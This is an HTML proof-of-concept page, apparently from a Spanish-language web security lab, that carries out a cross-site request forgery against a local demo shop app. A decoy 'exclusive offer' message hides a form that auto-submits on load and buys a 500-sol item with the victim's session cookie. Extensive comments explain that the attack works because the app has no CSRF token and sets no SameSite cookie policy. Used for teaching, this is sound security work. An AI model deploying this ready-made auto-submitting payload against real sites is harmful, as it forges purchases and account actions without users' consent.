<!DOCTYPE html>
<html lang="es">
<head>
    <!-- Título engañoso para que la víctima no sospeche si llega a ver la pestaña -->
    <meta charset="UTF-8">
    <title>¡Oferta exclusiva! 50% descuento hoy</title>
</head>
<body>

    <!-- Texto visible para distraer a la víctima mientras el ataque ocurre en segundo plano -->
    <h1>¡Cargando tu oferta especial...</h1>
    <p>Por favor espera un momento mientras procesamos tu descuento.</p>

    <!--
        FORMULARIO CSRF OCULTO
        Este formulario envía una petición POST a TiendaApp como si fuera enviada por maria.
        Está completamente oculto (display:none) para que la víctima no lo vea.
    -->
    <form
        id="formulario_csrf"
        action="http://localhost:5003/comprar"
        method="POST"
        style="display:none;"
    >
        <!--
            Campo 'producto': define el producto que se comprará sin el consentimiento de la víctima.
            El servidor acepta este valor directamente sin ningún token de validación.
        -->
        <input type="hidden" name="producto" value="iPhone 15 Pro">

        <!--
            Campo 'monto': establece el monto que se descontará del saldo de maria.
            500 soles se transferirán de la cuenta de maria como pago del producto falso.
        -->
        <input type="hidden" name="monto" value="500">
    </form>

    <script>
        /*
         * EJECUCIÓN AUTOMÁTICA AL CARGAR LA PÁGINA
         *
         * document.getElementById('formulario_csrf') — selecciona el formulario oculto por su id.
         * .submit() — envía el formulario automáticamente sin necesidad de que la víctima haga clic.
         *
         * Esto ocurre en el mismo instante en que el navegador termina de cargar la página,
         * por lo que la víctima no tiene oportunidad de intervenir ni darse cuenta.
         */
        document.getElementById('formulario_csrf').submit();
    </script>

    <!--
        ¿POR QUÉ FUNCIONA ESTE ATAQUE SI MARIA NO HIZO NADA?

        1. CONFIANZA DEL NAVEGADOR EN LAS COOKIES:
           Cuando el navegador de maria hace una petición HTTP a localhost:5003 (TiendaApp),
           incluye AUTOMÁTICAMENTE todas las cookies asociadas a ese dominio/puerto.
           Esto incluye la cookie de sesión de flask que prueba que maria está autenticada.
           El navegador no distingue si la petición viene de TiendaApp o de evil.com.

        2. AUSENCIA DE TOKEN CSRF:
           La ruta /comprar de app_vulnerable.py no exige ningún token adicional que
           demuestre que la petición fue iniciada voluntariamente por maria desde TiendaApp.
           Solo verifica que haya una sesión activa — condición que se cumple gracias al punto 1.

        3. POLÍTICA DE COOKIES INSEGURA:
           La aplicación no configura SameSite en sus cookies. Con SameSite=Strict o Lax,
           el navegador moderno NO enviaría la cookie de sesión en peticiones cross-site
           (desde evil.com hacia localhost:5003). Al no configurarlo, el navegador usa el
           comportamiento heredado: envía la cookie en cualquier petición.

        4. RESUMEN DEL FLUJO:
           a. Maria inicia sesión en TiendaApp (http://localhost:5003/login) → cookie de sesión creada.
           b. Maria, sin cerrar TiendaApp, visita http://evil.com/oferta.html (este archivo).
           c. El navegador carga la página → JavaScript ejecuta form.submit() automáticamente.
           d. El formulario envía POST a http://localhost:5003/comprar CON la cookie de sesión de maria.
           e. TiendaApp ve la cookie válida → autentica la petición → descuenta S/. 500 del saldo de maria.
           f. Maria nunca hizo clic en nada. El atacante recibió el "pedido" procesado.
    -->

</body>
</html>
